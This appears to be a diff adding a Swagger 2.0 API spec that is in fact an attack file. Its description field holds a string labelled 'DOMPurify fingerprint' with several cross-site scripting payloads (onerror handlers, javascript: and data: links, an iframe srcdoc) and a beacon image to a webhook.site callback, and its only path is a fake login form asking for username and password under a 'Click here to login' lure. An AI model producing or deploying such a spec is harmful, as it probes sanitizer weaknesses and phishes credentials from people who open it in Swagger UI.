@@ -1,0 +1,30 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: 'Swagger UI'
+  description: 'DOMPurify fingerprint: <img src=x onerror=alert(1)> | <a href="javascript:alert(2)">js</a> | <a href="data:text/html,<script>alert(3)</script>">data</a> | <iframe srcdoc="&lt;script&gt;alert(4)&lt;/script&gt;"></iframe> | <img src="https://webhook.site/REPLACE-ME?probe=dompurify" width=1>'
+paths:
+  /Login_Page:
+    post:
+      summary: Login here to continue
+      description: Please provide your credentials to continue.
+      parameters:
+        - name: username
+          in: formData
+          description: The username for login
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: The password for login
+          required: true
+          type: string
+      tags:
+        - Click here to login
+      responses:
+        '200':
+          description: OK
+        '400':
+          description: Bad request
+        '500':
+          description: Server error
